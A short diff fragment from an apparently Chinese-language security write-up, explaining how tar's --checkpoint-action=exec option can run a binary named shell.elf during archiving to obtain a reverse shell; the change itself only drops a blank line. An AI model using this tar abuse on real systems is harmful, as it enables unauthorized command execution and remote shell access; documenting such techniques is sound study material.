@@ -392,4 +392,3 @@ tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf 其
 `--checkpoint=1`: 指示`tar`每处理1条记录就触发一次“检查点”。
 `--checkpoint-action=exec=shell.elf`: 指定在每次触发检查点时。执行(`exec`)指定的程序，即`shell.elf`  
 所以`tar`就会在归档文件时触发检查点，执行shell.elf，反弹回一个shell。
-
